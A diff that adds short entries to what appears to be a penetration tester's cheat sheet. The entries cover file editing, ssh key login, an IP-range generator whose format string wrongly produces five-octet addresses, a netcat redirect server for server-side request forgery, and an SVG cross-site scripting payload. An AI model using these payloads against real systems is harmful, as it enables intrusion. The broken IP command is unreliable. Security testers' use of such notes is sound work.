@@ -136,5 +136,20 @@ Cisco password:
         mERr base 64 salt
         Q4J3cxRImm68KXqMDsLDs hashed salt + pass
 
-Replace contents of files
-    $ find . -name watchdog.sh -exec sed -r -e 's/(^.*)-t 10 -i/-t 9 -i/g' {} \; # replace file contents
+Others
+    Replace contents of files
+        *$ find . -name watchdog.sh -exec sed -r -e 's/(^.*)-t 10 -i/-t 9 -i/g' {} \; # replace file contents*
+
+    Ssh using private key
+        *$ ssh -i key host*
+
+    Generate Ip range
+        *$ seq -f "192.168.1.10.%g" 1 255*
+
+    SSRF web server
+        *$ while true ; do  echo -e "HTTP/1.1 301 Moved Permanently\r\nLocation: 127.0.0.1:22\r\n" | nc -vv -l -p 80  ; done*
+
+    Svg XSS payload
+        *<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE svg [<!ENTITY elem "">]>
+    <svg onload="alert(document.domain);" height="16" width="16">&elem;</svg>*
